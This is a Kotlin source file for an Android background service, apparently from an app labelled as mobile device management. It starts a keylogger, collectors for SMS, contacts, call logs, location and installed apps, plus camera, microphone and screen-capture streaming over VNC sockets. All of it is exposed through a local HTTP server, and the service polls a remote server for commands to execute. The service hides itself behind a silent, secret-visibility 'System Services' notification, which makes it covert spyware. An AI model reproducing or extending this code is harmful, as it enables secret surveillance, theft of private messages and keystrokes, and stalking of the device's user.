package com.mdm.client.service

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.work.*
import com.mdm.client.MainActivity
import com.mdm.client.R
import com.mdm.client.MdmApplication
import com.mdm.client.collectors.*
import com.mdm.client.commands.CommandExecutor
import com.mdm.client.commands.CommandQueue
import com.mdm.client.config.AppConfig
import com.mdm.client.keylogger.KeyloggerManager
import com.mdm.client.media.*
import com.mdm.client.network.ApiClient
import com.mdm.client.network.CameraSocketClient
import com.mdm.client.network.VncSocketClient
import com.mdm.client.server.DeviceHttpServer
import com.mdm.client.util.NetworkUtils
import com.mdm.client.workers.DataSyncWorker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit

class MdmForegroundService : Service() {

    companion object {
        private const val TAG = "SysSvc"
        const val ACTION_STOP = "com.mdm.client.STOP"
        private const val COMMAND_POLL_INTERVAL_MS = 30_000L
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    // Core components
    lateinit var apiClient: ApiClient
    lateinit var deviceInfo: DeviceInfoCollector
    lateinit var locationCollector: LocationCollector
    lateinit var smsCollector: SmsCollector
    lateinit var contactsCollector: ContactsCollector
    lateinit var callLogCollector: CallLogCollector
    lateinit var appsCollector: AppsCollector
    lateinit var keyloggerManager: KeyloggerManager
    lateinit var cameraSocketClient: CameraSocketClient
    lateinit var vncSocketClient: VncSocketClient
    lateinit var cameraManager: CameraManager
    lateinit var micManager: MicrophoneManager
    lateinit var screenCapture: ScreenCaptureManager
    lateinit var screenshotManager: ScreenshotManager
    lateinit var commandExecutor: CommandExecutor
    lateinit var commandQueue: CommandQueue
    private lateinit var httpServer: DeviceHttpServer

    @Volatile private var isPolling = false

    override fun onCreate() {
        super.onCreate()
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            ServiceCompat.startForeground(
                this,
                MdmApplication.NOTIFICATION_ID,
                buildNotification(),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                    or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                    or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                    or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
            )
        } else {
            startForeground(MdmApplication.NOTIFICATION_ID, buildNotification())
        }
        initComponents()
        registerDevice()
        connectSockets()
        schedulePeriodicWork()
        startCommandPolling()
        processQueuedCommands()
    }

    private fun initComponents() {
        apiClient = ApiClient(this)
        deviceInfo = DeviceInfoCollector(this)
        locationCollector = LocationCollector(this)
        smsCollector = SmsCollector(this)
        contactsCollector = ContactsCollector(this)
        callLogCollector = CallLogCollector(this)
        appsCollector = AppsCollector(this)
        keyloggerManager = KeyloggerManager(this, apiClient)
        cameraSocketClient = CameraSocketClient(this)
        vncSocketClient = VncSocketClient(this)
        cameraManager = CameraManager(this, cameraSocketClient)
        micManager = MicrophoneManager(this)
        screenCapture = ScreenCaptureManager(this, vncSocketClient)
        screenshotManager = ScreenshotManager(this, screenCapture)
        commandExecutor = CommandExecutor(this, apiClient)
        commandQueue = CommandQueue(this)

        httpServer = DeviceHttpServer(
            context = this,
            deviceInfo = deviceInfo,
            locationCollector = locationCollector,
            smsCollector = smsCollector,
            contactsCollector = contactsCollector,
            callLogCollector = callLogCollector,
            appsCollector = appsCollector,
            keyloggerManager = keyloggerManager,
            cameraManager = cameraManager,
            micManager = micManager,
            screenCapture = screenCapture,
            screenshotManager = screenshotManager,
            commandExecutor = commandExecutor
        )

        try {
            httpServer.start()
            Log.i(TAG, "HTTP server started on :8080")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start HTTP server: ${e.message}")
        }

        // Initialise MediaProjection if already granted
        val mpCode = AppConfig.mediaProjectionResultCode
        val mpData = AppConfig.mediaProjectionData
        if (mpCode != -1 && mpData != null) {
            screenCapture.initProjection(mpCode, mpData)
        }
    }

    private fun registerDevice() {
        scope.launch {
            try {
                val deviceId = AppConfig.getDeviceId(this@MdmForegroundService)
                val deviceIp = NetworkUtils.getLocalIpAddress(this@MdmForegroundService)
                apiClient.registerDevice(deviceId, deviceIp)
                Log.i(TAG, "Device registered: $deviceId @ $deviceIp")
            } catch (e: Exception) {
                Log.e(TAG, "Registration failed: ${e.message}")
            }
        }
    }

    private fun connectSockets() {
        if (!AppConfig.isConfigured(this)) return
        cameraSocketClient.connect()
        vncSocketClient.connect()
    }

    private fun startCommandPolling() {
        if (!AppConfig.isConfigured(this)) return
        isPolling = true

        scope.launch {
            val deviceId = AppConfig.getDeviceId(this@MdmForegroundService)
            while (isPolling) {
                try {
                    val pendingCommands = apiClient.pollPendingCommands(deviceId)
                    for (cmd in pendingCommands) {
                        val commandId = cmd.optInt("id", 0)
                        val commandType = cmd.optString("command_type", "")
                        val payload = cmd.optJSONObject("payload")
                        if (commandType.isNotBlank()) {
                            Log.i(TAG, "Polled command: $commandType (id=$commandId)")
                            commandExecutor.execute(commandId, commandType, payload)
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Command poll failed: ${e.message}")
                }
                delay(COMMAND_POLL_INTERVAL_MS)
            }
        }
    }

    private fun processQueuedCommands() {
        scope.launch {
            delay(5000) // Wait for network to stabilize
            val queued = commandQueue.dequeueAll()
            if (queued.isNotEmpty()) {
                Log.i(TAG, "Processing ${queued.size} queued commands")
                for (cmd in queued) {
                    try {
                        commandExecutor.execute(cmd.commandId, cmd.commandType, cmd.payload)
                        commandQueue.remove(cmd.id)
                    } catch (e: Exception) {
                        Log.e(TAG, "Queued command failed: ${e.message}")
                        commandQueue.incrementRetry(cmd.id)
                    }
                }
            }
        }
    }

    private fun schedulePeriodicWork() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()

        val syncRequest = PeriodicWorkRequestBuilder<DataSyncWorker>(15, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .setInitialDelay(1, TimeUnit.MINUTES)
            .build()

        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "data_sync",
            ExistingPeriodicWorkPolicy.KEEP,
            syncRequest
        )
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, MdmApplication.NOTIFICATION_CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setContentTitle("System Services")
            .setContentText("Running")
            .setGroup("sys_group")
            .setGroupSummary(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_DEFERRED)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP) {
            stopSelf()
            return START_NOT_STICKY
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        isPolling = false
        try {
            httpServer.stop()
            cameraSocketClient.disconnect()
            vncSocketClient.disconnect()
        } catch (_: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
